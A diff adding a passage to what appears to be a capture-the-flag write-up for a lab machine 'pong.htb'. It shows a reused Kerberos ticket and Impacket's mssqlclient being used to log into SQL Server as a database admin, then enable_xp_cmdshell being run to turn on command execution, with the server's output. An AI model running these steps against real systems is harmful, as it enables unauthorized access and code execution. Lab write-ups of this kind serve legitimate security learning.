@@ -870,6 +870,28 @@ As shows here the user is in the database admins group, making him a good target
 ```python
 ❯❯❯ export KRB5CCNAME=p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
 
+❯❯❯ faketime -f +8h mssqlclient.py pong.htb/p.reiner@dc2.pong.htb -k -no-pass -windows-auth
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC2): Line 1: Changed database context to 'master'.
+[*] INFO(DC2): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (pong\P.Reiner  dbo@master)> 
+```
+
+Then after exporting this ticket i can log in to the impacket client as this user!
+
+```python
+SQL (pong\P.Reiner  dbo@master)> enable_xp_cmdshell
+INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (pong\P.Reiner  dbo@master)> 
+
 
 ```
 
